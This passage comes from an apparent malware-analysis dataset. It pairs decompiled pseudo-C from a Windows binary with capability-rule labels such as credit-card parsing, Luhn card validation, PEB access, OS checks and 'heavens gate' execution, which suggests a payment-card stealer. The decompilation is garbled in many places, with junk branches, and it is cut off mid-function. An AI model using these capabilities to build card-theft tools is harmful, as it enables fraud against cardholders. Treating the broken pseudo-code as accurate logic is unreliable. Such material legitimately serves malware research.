        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404142) overlaps instruction at (ram,0x00404140)\n// \n// WARNING: Removing unreachable block (ram,0x00403ee5)\n// WARNING: Removing unreachable block (ram,0x0040407f)\n\nvoid fcn.00403e10(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar5;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    uchar uVar8;\n    uint8_t in_AF;\n    bool in_ZF;\n    char cVar9;\n    bool bVar10;\n    bool bVar11;\n    uint8_t uVar12;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar13;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    \n    bVar13 = false;\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        unaff_ESI = unaff_EDI;\n    }\n    uVar17 = 0x407010;\n    fcn.00403740(0x407010, 0x12, 0x24);\n    uVar16 = 0x407240;\n    uVar15 = 0x12;\n    fcn.00403740(0x407010, 0x12, 0x407240, 0xf);\n    uVar8 = unaff_EBX >> 8 < extraout_DH;\n    cVar9 = unaff_EDI == 1;\n    while ((fcn.00403740(uVar17, 0x12, 0x50),  !uVar8 && (uVar8))) {\n        if (extraout_ECX + -1 == 0 || cVar9 == '\\0') {\n            iVar6 = *unaff_ESI;\n            *unaff_EDI = unaff_ESI + 1;\n            iVar6 = iVar6 >> 0x1f;\n            unaff_ESI = 0x6ab8ec44;\n            iVar4 = (extraout_ECX + -1 >> 8 | *(*0x9750e2b5 + -0x5c)) << 8;\ncode_r0x00403ea5:\n            *(iVar6 + 0x12) = *(iVar6 + 0x12) + (iVar4 >> 8);\n            fcn.00403740(0x407010, uVar15, uVar16);\n            fcn.00403740(0x407010, 0x12, 0xb0);\n            fcn.00403740(0x407010, 0x12, 0xbc);\n            fcn.00403740(0x407010, 0x12, 0xc4);\n            fcn.00403740(0x407010, 0x12, 0x4072d0, 9);\n            uVar5 = extraout_ECX_00 & *(extraout_ECX_00 + 0x87cb1757);\n            uVar12 = uVar5 < 0;\n            bVar10 = uVar5 == 0;\n            fcn.00403740(0x407010, 0x12, 0x4072dc);\n            if ((!bVar10) && (bVar10)) {\n                uVar5 = (in_IF & 1) * 0x200;\n                uVar2 = uVar5 | (in_TF & 1) * 0x100;\n                in_NT = ((in_NT & 1) * 0x4000 & 0x4000) != 0;\n                bVar13 = (uVar5 & 0x400) != 0;\n                in_IF = (uVar2 & 0x200) != 0;\n                in_TF = ((uVar2 | (uVar12 & 1) * 0x80) & 0x100) != 0;\n                in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n                in_ID = (((in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000) & 0x200000) != 0;\n                in_AC = ((in_AC & 1) * 0x40000 & 0x40000) != 0;\n                in_VIP = 0;\n                in_VIF = 0;\n            }\n            fcn.00403740(0x407010, 0x12, 0x4072e8, 0xc);\n            bVar10 = false;\n            bVar11 = false;\n            uVar8 = 0xf4;\n            uVar16 = 0x12;\n            uVar15 = 0x407010;\n            fcn.00403740(0x407010, 0x12, 0xf4);\n            if ((!bVar10 && !bVar11) && (bVar10 || bVar11)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar17 = 10;\n            uVar5 = 0x403ff5;\n            uVar12 = fcn.00403740(0x407010, 0x12, 0x4072f8, 10);\n            if ((bVar10) || (uVar5 = uVar5 & 0xffff | unaff_EDI << 0x10,  !bVar10)) {\n                uVar5 = 0x40;\n            }\n            cVar9 = uVar12 - *unaff_EDI;\n            iVar6 = func_0x10189f7f((in_NT & 1) * 0x4000 | SBORROW1(uVar12, *unaff_EDI) * 0x800 | bVar13 * 0x400 |\n                                    (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (cVar9 < '\\0') * 0x80 |\n                                    (cVar9 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar9) & 1U) == 0) * 4 |\n                                    uVar12 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 |\n                                    (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000, uVar5);\n            bVar10 = (POPCOUNT(*(iVar6 + -0x7f + unaff_EBX) & 0x4b) & 1U) == 0;\n            uVar14 = fcn.00403740(0x407010, 0x12, 0x407304);\n            pcVar7 = uVar14 >> 0x20;\n            uVar3 = uVar14;\n            if ((bVar10) || (!bVar10)) {\n                pcVar7[0x12] = pcVar7[0x12] + (extraout_ECX_01 >> 8);\n                fcn.00403740(0x407010, 0x12, 0x407344, 0xc);\n                fcn.00403740(0x407010, 0x12, 0x407350, 0xb);\n                fcn.00403740(0x407010, 0x12, 0x40735c, 4);\n                uVar8 = 4;\n                uVar16 = 0x407360;\n                uVar15 = 0x12;\n                uVar17 = 0x407010;\n            }\n            else {\n                out(*(unaff_ESI + -1), uVar14 >> 0x20);\n                do {\n                    cVar9 = uVar3 >> 8;\n                    in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                    uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar9 - in_AF), -in_AF);\n                } while (in_AF || cVar9 == *pcVar7);\n                piVar1 = unaff_EDI + pcVar7 * 2 + bVar13 * -2 + 1;\n                *piVar1 = (*piVar1 + 0x7b) - in_AF;\n                *(extraout_ECX_01 + 0x6a) = uVar3;\n            }\n            fcn.00403740(uVar17, uVar15, uVar16, uVar8);\n            fcn.00403740(0x407010, 0x12, 0x407364, 0xc);\n            fcn.00403740(0x407010, 0x12, 0x407370, 4);\n            bVar13 = false;\n            fcn.00403740(0x407010, 0x12, 0x407374, 9);\n            if ((!bVar13) && (bVar13)) {\n                *(unaff_EBX + 0x40) = *(unaff_EBX + 0x40);\n            }\n            fcn.00403740(0x407010, 0x12);\n            fcn.00403740(0x407010, 0x12);\n            return;\n        }\n    }\n    uVar16 = 0x4072a4;\n    uVar15 = 0x12;\n    iVar4 = extraout_ECX;\n    iVar6 = extraout_EDX;\n    goto code_r0x00403ea5;\n}\n",
        "token_count": 2300
    },
    "004044e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404598) overlaps instruction at (ram,0x00404594)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040454e)\n\nuint __cdecl fcn.004044e0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint8_t extraout_CL;\n    uint extraout_ECX;\n    uint *puVar4;\n    uchar *puVar5;\n    int32_t *unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t *piVar6;\n    bool bVar7;\n    ulong uVar8;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&fcn.004044e0::lpBuffer, &fcn.004044e0::pcbBuffer);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    piVar6 = unaff_EDI;\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        out(0xc4, iVar2);\n        piVar6 = unaff_EDI + 1;\n        *unaff_EDI = iVar2;\n    }\n    uVar8 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, &fcn.004044e0::lpBuffer, &fcn.004044e0::var_114h, &fcn.004044e0::var_4h, \n                       &fcn.004044e0::var_31ch, &fcn.004044e0::var_8h, &fcn.004044e0::var_10h);\n    puVar3 = uVar8;\n    bVar7 = puVar3 == NULL;\n    if (!bVar7) {\n        if ((bVar7) || (iVar2 = uVar8 >> 0x20,  !bVar7)) {\n            puVar3 = &fcn.004044e0::var_114h;\n            iVar2 = arg_8h;\n        }\n        *piVar6 = *unaff_ESI;\n        puVar3[-1] = 0x8be181d0;\n        *0x8be06e55 = *0x8be06e55 | extraout_CL;\n        pcVar1 = *(iVar2 + 0x50);\n        puVar4 = puVar3 + -2;\n        puVar3[-2] = 0x4045a3;\n        (*pcVar1)();\n        puVar5 = puVar4 + -4;\n        *(puVar4 + -4) = 0x4045a9;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        if (iVar2 != 0) {\n            *(puVar5 + -4) = extraout_ECX;\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 745
    },
    "004047f0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040484f) overlaps instruction at (ram,0x0040484e)\n// \n\nulong fcn.004047f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint8_t *unaff_EBX;\n    bool bVar3;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    var_94h = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&var_94h);\n    bVar3 = var_90h + -5 < 0;\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((bVar3) || (!bVar3)) {\n        bVar3 = var_90h == 6;\n    }\n    else {\n        piVar2 = iVar1 + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *piVar2 = *piVar2 + 1;\n        bVar3 = *piVar2 == 0;\n    }\n    if ((bVar3) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "00401620": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401620(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x407454;\n    var_10h = 0x40744c;\n    var_ch = 0x40745c;\n    var_8h = 0x407464;\n    var_4h = 0x40746c;\n    uVar2 = 0;\n    puVar3 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar3);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x407444);\n    return iVar1 == 0;\n}\n",
        "token_count": 289
    },
    "004045d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004045d0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00404440(0x80000002, 0x4071ec, 0x407238, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00404910": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404910(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    float10 in_ST0;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    if ((-1 < arg_ch) && (-1 >= arg_ch)) {\n        *(puVar5 + 0x1f) = in_ST0;\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4070a0, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070b8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070e0;\n    var_30h = 0x4070ec;\n    var_2ch = 0x4070f8;\n    var_28h = 0x407108;\n    var_24h = 0x407110;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1136
    },
    "00401d40": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401edb) overlaps instruction at (ram,0x00401ed9)\n// \n// WARNING: Removing unreachable block (ram,0x00401edb)\n\nvoid fcn.00401d40(void)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t extraout_ECX_00;\n    uint32_t unaff_EBX;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint *unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint *puVar7;\n    uint16_t in_ES;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    code *pcVar11;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    fcn.004041a0();\n    uVar3 = fcn.00401530();\n    bVar8 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    if (uVar3 != 0) {\n        if ((bVar8) || (iVar4 = extraout_ECX,  !bVar8)) {\n            iVar4 = 0x40;\n            uVar3 = 0;\n            unaff_EDI = &var_25fh;\n        }\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *unaff_EDI = uVar3;\n            unaff_EDI = unaff_EDI + 1;\n        }\n        *unaff_EDI = uVar3;\n        *(unaff_EDI + 2) = uVar3;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        bVar8 = iVar4 == 0;\n        if (!bVar8) {\n            if ((bVar8) || (!bVar8)) {\n                fcn.00402900();\n            }\n            else {\n                *(unaff_EDI + 3) = *unaff_ESI;\n                piVar5 = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n                puVar6 = 0xe8e181d0;\n                *piVar5 = *piVar5 - extraout_ECX_00;\n            }\n            puVar6[-0x15c] = 0;\n            puVar7 = puVar6 + -0x15b;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(puVar6 + -0x15c, 0x4073c0, puVar6 + -0x260, 0x4073a0, 3);\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            *(puVar6 + -0x14) = 0;\n            do {\n                puVar7 = puVar6 + -0x58;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *(puVar6 + -0x28) = 0;\n                *(puVar6 + -0x10) = 0;\n                *(puVar6 + -0xc) = 0;\n                *(puVar6 + -0x58) = 0x44;\n                *(puVar6 + -8) = 0;\n                *(puVar6 + -0x2c) = 1;\n                *(puVar6 + -4) = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, puVar6 + -0x15c, 0, 0, 0, 0, 0, 0, puVar6 + -0x58, puVar6 + -0x10);\n                cVar10 = '\\0';\n                cVar9 = iVar4 < 0;\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar1)(3000);\n                pcVar11 = fcn.00401c30;\n                uVar2 = (*_sym.imp.USER32.dll_EnumWindows)(fcn.00401c30, *(puVar6 + -8));\n                if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n                    pcVar11 = pcVar11 & 0xffff0000 | in_ES;\n                    *(puVar7 | puVar6) = uVar2;\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(puVar6 + -0x10), 1000, pcVar11);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puVar6 + -0x10), 1);\n                }\n                pcVar11 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar6 + -0xc));\n                (*pcVar11)(*(puVar6 + -0x10));\n                iVar4 = *(puVar6 + -0x14);\n                *(puVar6 + -0x14) = iVar4 + 1;\n            } while (iVar4 + 1 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1332
    },
    "00402ad0": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00403390": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040341f) overlaps instruction at (ram,0x0040341d)\n// \n// WARNING: Removing unreachable block (ram,0x004033e3)\n// WARNING: Removing unreachable block (ram,0x004034b9)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00403390(ushort *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char **ppcVar3;\n    char cVar5;\n    char *in_EAX;\n    uint uVar4;\n    uint16_t uVar6;\n    uint32_t in_ECX;\n    uchar *in_EDX;\n    uchar *puVar7;\n    uchar *unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t unaff_ESI;\n    char **unaff_EDI;\n    uint16_t in_SS;\n    ushort in_DS;\n    bool bVar10;\n    uint16_t uStack40;\n    int16_t iStack36;\n    uchar *puStack28;\n    uint16_t uStack24;\n    ushort uStack20;\n    \n    puVar8 = &stack0xfffffffc;\n    uStack20 = SUB42(in_EAX, 0);\n    uStack24 = in_ECX;\n    uStack24 = uStack24 | 0x31fd;\n    *arg_8h = 0x4e;\n    puStack28 = in_EDX;\n    if (((uStack24 != 0) && (in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff,  uStack24 == 0)) ||\n       (*(arg_8h + 1) = 4,  puVar7 = in_EDX,  -1 < uStack24)) {\n        ppcVar3 = CONCAT22(uStack20, in_SS);\n        *(ppcVar3 + in_ECX) = *(ppcVar3 + in_ECX) + in_EAX;\n        *arg_8h = in_DS;\n        *in_EAX = *in_EAX + in_EAX;\n        pcVar1 = unaff_ESI + 0x52;\n        cVar2 = *pcVar1;\n        cVar5 = in_EAX >> 8;\n        *pcVar1 = *pcVar1 + cVar5;\n        puVar7 = 0x47;\n        unaff_EDI = ppcVar3;\n        if (SCARRY1(cVar2, cVar5) != *pcVar1 < '\\0') {\n            out(0xc4, in_EAX);\n            unaff_EBX = in_EDX & 0xffff0000 | in_ECX ^ 0x47;\n            puStack28 = in_EDX & 0xffff0000 | in_SS;\n            unaff_EDI = ppcVar3 + 1;\n            *ppcVar3 = in_EAX;\n            puVar7 = unaff_EBX;\n        }\n    }\n    do {\n        *(arg_8h + 1) = 0x21;\n        uStack40 = unaff_EDI;\n        *(arg_8h + 3) = 0x7d;\n        bVar10 = (POPCOUNT(puVar7 + -0x51) & 1U) == 0;\n        *(arg_8h + 2) = 0xff;\n        iStack36 = in_ECX;\n        if ((bVar10) || (!bVar10)) {\n            *(arg_8h + 5) = 0xa9;\n        }\n        *(arg_8h + 3) = 0x4e;\n        uVar6 = iStack36 - 1U & uStack40 | 0x61be;\n        bVar10 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        *(arg_8h + 7) = 0xe4;\n        if ((uVar6 != 0) && (uVar6 == 0)) {\n            out(*unaff_EBX, puStack28);\n        }\n        *(arg_8h + 4) = 0x41;\n        puVar7 = puStack28;\n        if ((bVar10) || (!bVar10)) goto code_r0x00403498;\n        segment(in_SS, *0x10 + -0x14);\n        puVar7 = 0xb7bc9ea5;\n    } while (bVar10);\n    bVar10 = (POPCOUNT(&stack0xfffffff0 & 0xff) & 1U) == 0;\ncode_r0x00403498:\n    *(arg_8h + 9) = 0xb9;\n    if ((!bVar10) && (bVar10)) {\n        puVar9 = &uStack24;\n        cVar2 = '\\x1e';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar8;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return CONCAT44(puVar7, uVar4);\n    }\n    *(arg_8h + 5) = 0xd7;\n    *arg_ch = 0xb;\n    return CONCAT44(puVar7, arg_ch);\n}\n",
        "token_count": 1227
    },
    "004041a0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404399) overlaps instruction at (ram,0x00404395)\n// \n\nvoid fcn.004041a0(void)\n\n{\n    uint8_t uVar1;\n    uint8_t extraout_CH;\n    int32_t unaff_EDI;\n    bool bVar2;\n    float10 fVar3;\n    \n    uVar1 = fcn.00403740(0x407010, 0x12, 0x73a0, 0x20);\n    bVar2 = (extraout_CH & uVar1 ^ 6) < '\\0';\n    fVar3 = fcn.00403740(0x407010, 0x12, 0x73c0, 0x26);\n    if ((!bVar2) && (bVar2)) {\n        *(unaff_EDI + 0x1c) = fVar3;\n    }\n    fcn.00403740(0x407010, 0x12, 0x4073e8, 8);\n    fcn.00403740(0x407010, 0x12, 0x73f0);\n    fcn.00403740(0x407010, 0x12, 0x740c);\n    fcn.00403740(0x407010, 0x12, 0x7418);\n    fcn.00403740(0x407010, 0x12, 0x742c);\n    fcn.00403740(0x407010, 0x12, 0x7440);\n    fcn.00403740(0x407010, 0x12, 0x7444);\n    fcn.00403740(0x407010, 0x12, 0x744c);\n    fcn.00403740(0x407010, 0x12, 0x407454, 6);\n    fcn.00403740(0x407010, 0x12, 0x745c);\n    fcn.00403740(0x407010, 0x12, 0x407464);\n    fcn.00403740(0x7010, 0x12);\n    fcn.00403740(0x7010, 0x12);\n    fcn.00403740(0x7010, 0x12);\n    return;\n}\n",
        "token_count": 533
    },
    "00404c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404c20(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402fc0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411724;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00404c80": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d07) overlaps instruction at (ram,0x00404d06)\n// \n// WARNING: Removing unreachable block (ram,0x00404d4f)\n\nvoid __fastcall fcn.00404c80(uint32_t param_1, uint32_t param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t in_EAX;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    uint *unaff_ESI;\n    uchar *puVar8;\n    uint *unaff_EDI;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar9;\n    bool bVar10;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint32_t uStackY28;\n    uint32_t uStackY24;\n    \n    puVar7 = &stack0xfffffffc;\n    *param_3 = 0x52;\n    uVar3 = param_2 & 0xffff;\n    uVar4 = param_1 & 0xffff;\ncode_r0x00404cbb:\n    uStackY24 = uVar4;\n    uStackY28 = uVar3;\n    param_3[1] = 0x3c;\n    bVar10 = -1 < (in_EAX ^ unaff_EBX);\n    param_3[2] = 0x22;\n    if ((bVar10) && (!bVar10)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        param_3 = param_3 + 5;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    do {\n        param_3[3] = 0x33;\n        uVar5 = uStackY24 | 0x31fd;\n        bVar10 = uVar5 < 0;\n        bVar9 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n        iVar1 = *(puVar7 + 8);\n        *(iVar1 + 4) = 0xa8;\n        uVar6 = uStackY28;\n        if ((bVar9) && (!bVar9)) {\n            puVar2 = segment(in_SS, *0x10 + -0xc);\n            uVar6 = 0xb7bc9ea5;\n            uVar3 = unaff_EBX;\n            uVar4 = uStackY28;\n            in_EAX = uStackY24;\n            if (!bVar9) goto code_r0x00404cbb;\n            bVar10 = &stack0xfffffff8 < 0;\n            in_EAX = *puVar2;\n            unaff_ESI = 0xb7bc9ea5;\n        }\n        *(iVar1 + 5) = 0x80;\n        puVar8 = param_3;\n        if ((!bVar10) && (bVar10)) {\n            in_SS = SUB42(unaff_ESI, 0);\n            puVar8 = param_3 + -1;\n            *(unaff_EDI | puVar7) = in_EAX;\n            uVar6 = uVar6 & 0xffffff00;\n            in_EAX = in_EAX + (in_EAX >> 8) * 'y';\n            unaff_ESI = unaff_ESI & 0xffff0000 | in_ES;\n        }\n        unaff_EDI = unaff_ESI;\n        *(iVar1 + 6) = 0xbd;\n        uStackY28 = uVar6 & 0xffff;\n        bVar10 = (POPCOUNT(uVar6 - 1U & iVar1 & 0xff) & 1U) == 0;\n        *(iVar1 + 7) = 0x65;\n        if ((bVar10) || (!bVar10)) {\ncode_r0x00404d8b:\n            **(puVar7 + 0xc) = 8;\n            return;\n        }\n        param_3 = *unaff_EDI;\n        *unaff_EDI = puVar8;\n    